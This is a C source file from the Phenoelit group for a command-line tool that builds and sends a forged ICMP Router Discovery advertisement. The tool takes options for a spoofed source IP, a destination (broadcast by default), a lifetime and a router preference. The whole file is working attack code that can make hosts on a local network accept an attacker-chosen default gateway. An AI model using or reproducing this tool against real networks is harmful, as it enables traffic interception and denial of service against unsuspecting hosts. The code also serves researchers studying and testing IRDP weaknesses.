/* IRDP
 *
 * FX <fx@phenoelit.de>
 * Phenoelit (http://www.phenoelit.de)
 * (c) 2k
 *
 * $Id: irdp.c,v 1.3 2001/07/03 20:00:10 fx Exp $
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netinet/in.h>
#include <rpc/types.h>
#include <netdb.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <errno.h>
#include <math.h>

#include <netinet/in.h>                 /* for IPPROTO_bla consts */
#include <netpacket/packet.h>
#include <net/ethernet.h>               /* to get my own ETH addr */
#include <net/if.h>


#include "protocols.h"
#include "packets.h"


/* definitions */
#define IP_ADDR_LEN	4
#define IP_IRDP_TTL	0x80
#define IP_BCAST	"255.255.255.255"

#define DEFAULT_LIFETIME	1800

/* config */
struct {
    int			verbose;
    char		*device;

    int			spoof_src;
    struct in_addr	src;
    int			set_dest;
    struct in_addr	dest;

    unsigned long int	pref;
    unsigned int	lifetime;
} cfg;

/************************************
 * globals */
u_char			*rawpacket;
int			atsock;

/************************************
 * prototypes */
void	usage(char *n);
u_char	*construct_irdp_advertisement(int *psize);


/* the main function */
int	main(int argc, char **argv) {
    char		option;
    extern char		*optarg;
    int			plength;


    memset(&cfg,0,sizeof(cfg));
    cfg.lifetime=DEFAULT_LIFETIME;
    while ((option=getopt(argc,argv,"vi:S:D:p:l:"))!=EOF) {
	switch (option) {
	    case 'v':	/* verbose */
			cfg.verbose++;
			break;
	    case 'i':	/* local network device */
			cfg.device=smalloc(strlen(optarg)+1);
			strcpy(cfg.device,optarg);
			break;
	    case 'S':	/* spoof source */
			if (inet_aton(optarg,&(cfg.src))==0) {
			    fprintf(stderr,
				    "source IP address seems to be wrong\n");
			    return (1);
			}
			cfg.spoof_src++;
			break;
	    case 'D':	/* set destination */
			if (inet_aton(optarg,&(cfg.dest))==0) {
			    fprintf(stderr,
				    "dest. IP address seems to be wrong\n");
			    return (1);
			}
			cfg.set_dest++;
			break;
	    case 'p':	/* preference - usually 0 */
			cfg.pref=atol(optarg);
			break;
	    case 'l':	/* life time */
			cfg.lifetime=atoi(optarg);
			break;
	    default:	usage(argv[0]);
	}
    }

    if (!(cfg.device)) usage(argv[0]);

    /* set up socket ... */
    if ((atsock=init_socket_IP4(cfg.device,1))==(-1)) return(1);

    /* if spoofing is disabled, copy it */
    if (!cfg.spoof_src) {
	memcpy(&(cfg.src.s_addr), &(packet_ifconfig.ip.s_addr), IP_ADDR_LEN);
    }
    /* if destination is not set, use bcast */
    if (!cfg.set_dest) {
	inet_aton(IP_BCAST,&(cfg.dest));
    }

    /* create the packet */
    rawpacket=construct_irdp_advertisement(&plength);
    sendpack_IP4(atsock,rawpacket,plength);
    free(rawpacket);

    /* at the end of the day, close our socket */
    close(atsock);

    return (0);
}



/********************** FUNCTIONS **********************/

/* constructs the IRDP request packet
 * * Returns a pointer to the packet or NULL if failed
 * * returns also the size in *psize */
u_char	*construct_irdp_advertisement(int *psize) {
    u_char			*tpacket;
    iphdr_t			*iph;
    icmphdr_t			*icmph;
    irdp_t			*irdph;
    irdp_rec_t			*irdprec;
    u_int16_t			cs;		/* checksum */


    *psize=sizeof(irdp_rec_t)+sizeof(irdp_t)+sizeof(icmphdr_t)+sizeof(iphdr_t);
    tpacket=(u_char *)smalloc(*psize
	    +3 /* for my checksum function, which sometimes 
		  steps over the mark */
	    );

    /* make up IP packet */
    iph=(iphdr_t *)tpacket;

    iph->version=4;
    iph->ihl=sizeof(iphdr_t)/4;

    iph->tot_len=htons(*psize);
    iph->ttl=IP_IRDP_TTL;
    iph->protocol=IPPROTO_ICMP;

    memcpy(&(iph->saddr.s_addr),&(cfg.src.s_addr),IP_ADDR_LEN);
    memcpy(&(iph->daddr.s_addr),&(cfg.dest.s_addr),IP_ADDR_LEN);

    /* make up the icmp header */
    icmph=(icmphdr_t *)(tpacket+sizeof(iphdr_t));
    icmph->type=ICMP_ROUTER_ADVERT;
    icmph->code=0;
    icmph->checksum=0;

    /* make up the irdp base information */
    irdph=(irdp_t *)(tpacket+sizeof(iphdr_t)+sizeof(icmphdr_t));
    irdph->num_addr=0x01;	/* one address */
    irdph->addrsize=0x02;	/* two words */
    irdph->lifetime=htons(cfg.lifetime);

    /* make up the irdp address record */
    irdprec=(irdp_rec_t *)(tpacket+sizeof(iphdr_t)+
	    sizeof(icmphdr_t)+sizeof(irdp_t));
    memcpy(&(irdprec->addr),&(cfg.src.s_addr),IP_ADDR_LEN);
    irdprec->pref=htonl(cfg.pref);

    /* make up checksum */
    cs=chksum((u_char *)icmph,(*psize-sizeof(iphdr_t)));
    icmph->checksum=cs;

    return tpacket;
}


void	usage(char *n) {
    printf(
	    "Usage: \n"
	    "%s [-v (useless)] -i <interface> \n\t"
	    "[-S <spoofed source IP>] [-D <destination ip>]\n\t"
	    "[-l <lifetime in sec, default: 1800>] [-p <preference>]\n",
	    n);
    exit (1);
}
